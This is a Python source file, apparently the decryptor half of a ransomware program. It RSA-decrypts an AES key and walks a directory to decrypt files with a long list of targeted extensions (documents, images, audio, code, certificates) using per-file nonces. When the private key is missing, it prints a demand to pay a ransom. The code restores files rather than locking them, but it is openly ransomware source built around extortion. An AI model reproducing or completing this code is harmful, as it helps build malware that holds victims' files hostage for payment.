import os

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import AES

TARGET_FILES = [
    ".txt",
    ".doc",
    ".docx",
    ".docm",
    ".odt",
    ".wav",
    ".mp3",
    ".ogg",
    ".ppt",
    ".pptx",
    ".png",
    ".jpg",
    ".jpeg",
    ".bmp",
    ".svg",
    ".cpp",
    ".gd",
    ".psd",
    ".pdf",
    ".cer",
]


def load_key():
    f = open("AES_KEY", mode="rb")
    data = f.read()

    rsa_key = RSA.importKey(open("RSA_PRIVATE_KEY").read())
    cipher = PKCS1_OAEP.new(rsa_key)
    key = cipher.decrypt(data)
    return key


def decrypt_file_aes(input_file, output_file, key):
    f = open(input_file, mode="rb")
    data = f.read()

    fn = open(input_file + ".n", mode="rb")
    nonce = fn.read()
    fn.close()

    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    deciphertext = cipher.decrypt(data)

    with open(output_file, "wb") as f:
        f.write(deciphertext)

    # After decryption, all of the .n files containing the nonce values are deleted.
    os.remove(input_file + ".n")


def decrypt_all_files(dir, key):
    all_files = []
    for root, dirs, files in os.walk(dir):
        for f in files:
            filename, file_ext = os.path.splitext(f)
            if file_ext in TARGET_FILES and not f.endswith(".n"):
                all_files.append((f, root))

    for f in all_files:
        # The odd formatting here is a holdover from an earlier implementation that gave the encrypted files a unique prefix.
        decrypt_file_aes(f[1] + "/" + f[0], f[1] + "/" + f[0], key)


if os.path.exists("RSA_PRIVATE_KEY"):
    print("Private key found. Commencing decryption...")
    key = load_key()
    decrypt_all_files("files", key)
else:
    print("Private key not found! Pay your ransom to receive the private key!")
